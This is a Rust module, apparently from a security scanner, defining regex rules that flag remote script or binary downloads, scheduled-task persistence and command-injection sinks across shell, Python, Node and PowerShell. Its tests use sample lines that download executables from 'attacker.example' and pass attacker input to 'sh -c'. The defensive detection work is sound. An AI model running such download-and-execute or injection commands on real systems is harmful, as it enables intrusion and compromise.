use crate::patterns::compile_patterns;
use crate::ports::CompiledPattern;
use std::sync::LazyLock;

fn compile_each(entries: &[(&'static str, &str)]) -> Vec<(&'static str, CompiledPattern)> {
    let raw: Vec<&str> = entries.iter().map(|(_, pattern)| *pattern).collect();
    entries
        .iter()
        .map(|(id, _)| *id)
        .zip(compile_patterns(&raw))
        .collect()
}

pub(crate) static REMOTE_BINARY_PATTERNS: LazyLock<Vec<(&'static str, CompiledPattern)>> =
    LazyLock::new(|| {
        compile_each(&[
            (
                "SCRIPT_REMOTE_BINARY_DOWNLOAD",
                // `\b` anchors prevent substring hits inside unrelated
                // tokens like `mycurl`, `securl-helper`, `awget-utility`.
                r"(?i)\b(curl|wget)\b.*(\.sh|\.ps1|\.py|\.js|\.exe|\.pkg|\.dmg|\.deb|\.rpm)",
            ),
            (
                "SCRIPT_POWERSHELL_REMOTE_DOWNLOAD",
                r"(?i)invoke-webrequest.+(\.ps1|\.exe|\.zip)",
            ),
        ])
    });

pub(crate) static DEFERRED_PATTERNS: LazyLock<Vec<(&'static str, CompiledPattern)>> =
    LazyLock::new(|| {
        compile_each(&[
            (
                "SCRIPT_DEFERRED_EXECUTION",
                r"(?i)(crontab|schtasks|at\s+\d|systemd-run|launchctl\s+load)",
            ),
            (
                "SCRIPT_PERSISTENCE",
                r"(?i)(/etc/cron|~/\.config/autostart|launchagents|startup\\|runonce)",
            ),
        ])
    });

pub(crate) static SHELL_INJECTION_PATTERNS: LazyLock<Vec<(&'static str, CompiledPattern)>> =
    LazyLock::new(|| {
        compile_each(&[
            (
                "COMMAND_INJECTION_SINK_SHELL",
                // `\b` prevents substring hits inside unrelated tokens like
                // `rebash`, `nashbash`, `myash` — pre-fix any string ending
                // in `bash` or `sh` followed by ` -c $VAR` matched.
                r#"(?i)\b(bash|sh)\s+-c\s+["']?\$[A-Za-z_][A-Za-z0-9_]*"#,
            ),
            (
                "UNSAFE_USER_CONTROLLED_EXEC_SHELL",
                r"(?i)(curl|wget)[^\n]{0,180}(\$[1-9]|\$\{?[A-Za-z_]*(INPUT|USER_INPUT|CMD|COMMAND|ARGS?|REQUEST_URL|TARGET_URL)\}?)",
            ),
        ])
    });

pub(crate) static PYTHON_INJECTION_PATTERNS: LazyLock<Vec<(&'static str, CompiledPattern)>> =
    LazyLock::new(|| {
        compile_each(&[
            (
                "COMMAND_INJECTION_SINK_PYTHON",
                r"(?i)subprocess\.(run|popen|call)\([^)]*shell\s*=\s*true",
            ),
            (
                "UNSAFE_USER_CONTROLLED_EXEC_PYTHON",
                r#"(?i)os\.system\(f?["'][^"']*\{[A-Za-z_][A-Za-z0-9_]*\}"#,
            ),
        ])
    });

pub(crate) static NODE_INJECTION_PATTERNS: LazyLock<Vec<(&'static str, CompiledPattern)>> =
    LazyLock::new(|| {
        compile_each(&[
            (
                "COMMAND_INJECTION_SINK_NODE",
                r"(?i)child_process\.(exec|spawn)\([^)]*(req\.|process\.argv|userInput|input|cmd|command)",
            ),
            (
                "UNSAFE_USER_CONTROLLED_EXEC_NODE",
                r"(?i)child_process\.(exec|spawn)\([^)]*(req\.|process\.argv|userInput|input)",
            ),
        ])
    });

pub(crate) static POWERSHELL_INJECTION_PATTERNS: LazyLock<Vec<(&'static str, CompiledPattern)>> =
    LazyLock::new(|| {
        compile_each(&[
            (
                // Accepts the cmdlet `Invoke-Expression` AND its alias `iex`,
                // followed by ANY of the three idiomatic argument-binding
                // shapes — whitespace, parenthesis, or a string-quote
                // delimiter (`"`/`'`) — before the `$variable`. Pre-fix
                // only `\s+` was accepted, so `Invoke-Expression($cmd)`
                // (paren without space) and `iex($cmd)` evaded detection
                // entirely. `\b` anchors prevent substring hits inside
                // unrelated tokens like `apex`, `complex`, `vertex`.
                "COMMAND_INJECTION_SINK_POWERSHELL",
                r#"(?i)\b(invoke-expression|iex)\b[\s("']*\$[A-Za-z_][A-Za-z0-9_]*"#,
            ),
            (
                "UNSAFE_USER_CONTROLLED_EXEC_POWERSHELL",
                r#"(?i)\bstart-process\b[\s("']*\$[A-Za-z_][A-Za-z0-9_]*"#,
            ),
        ])
    });

#[cfg(test)]
mod tests {
    use super::*;

    fn matches(patterns: &[(&'static str, CompiledPattern)], rule_id: &str, input: &str) -> bool {
        patterns
            .iter()
            .find(|(id, _)| *id == rule_id)
            .map(|(_, re)| re.is_match(input))
            .unwrap_or(false)
    }

    /// Contract: `SCRIPT_REMOTE_BINARY_DOWNLOAD` matches real `curl`/`wget`
    /// invocations followed by an executable URL, but MUST NOT match
    /// substrings like `mycurl`, `securl`, `awget`. Pre-fix the regex had
    /// no `\b` anchor so any token ending in `curl`/`wget` matched.
    #[test]
    fn remote_binary_download_requires_word_boundary() {
        assert!(matches(
            &REMOTE_BINARY_PATTERNS,
            "SCRIPT_REMOTE_BINARY_DOWNLOAD",
            "curl https://attacker.example/x.exe",
        ));
        assert!(matches(
            &REMOTE_BINARY_PATTERNS,
            "SCRIPT_REMOTE_BINARY_DOWNLOAD",
            "wget https://attacker.example/x.sh",
        ));
        assert!(
            !matches(
                &REMOTE_BINARY_PATTERNS,
                "SCRIPT_REMOTE_BINARY_DOWNLOAD",
                "mycurl http://benign.example/x.exe",
            ),
            "`mycurl` is not a real curl invocation; must not match",
        );
        assert!(
            !matches(
                &REMOTE_BINARY_PATTERNS,
                "SCRIPT_REMOTE_BINARY_DOWNLOAD",
                "securl-helper http://benign.example/x.sh",
            ),
            "`securl-helper` is a substring; must not match",
        );
        assert!(
            !matches(
                &REMOTE_BINARY_PATTERNS,
                "SCRIPT_REMOTE_BINARY_DOWNLOAD",
                "awget-utility http://benign.example/x.deb",
            ),
            "`awget-utility` is a substring; must not match",
        );
    }

    /// Contract: `COMMAND_INJECTION_SINK_SHELL` matches genuine `bash -c`
    /// or `sh -c` followed by a `$VAR` injection, but MUST NOT match
    /// substring prefixes like `rebash`, `nashbash`, `myash`.
    #[test]
    fn shell_command_injection_requires_word_boundary() {
        assert!(matches(
            &SHELL_INJECTION_PATTERNS,
            "COMMAND_INJECTION_SINK_SHELL",
            "bash -c $USER_CMD",
        ));
        assert!(matches(
            &SHELL_INJECTION_PATTERNS,
            "COMMAND_INJECTION_SINK_SHELL",
            "sh -c \"$ATTACKER_INPUT\"",
        ));
        assert!(
            !matches(
                &SHELL_INJECTION_PATTERNS,
                "COMMAND_INJECTION_SINK_SHELL",
                "rebash -c $X",
            ),
            "`rebash` is a substring; must not match",
        );
        assert!(
            !matches(
                &SHELL_INJECTION_PATTERNS,
                "COMMAND_INJECTION_SINK_SHELL",
                "nashbash -c $X",
            ),
            "`nashbash` is a substring; must not match",
        );
    }
}
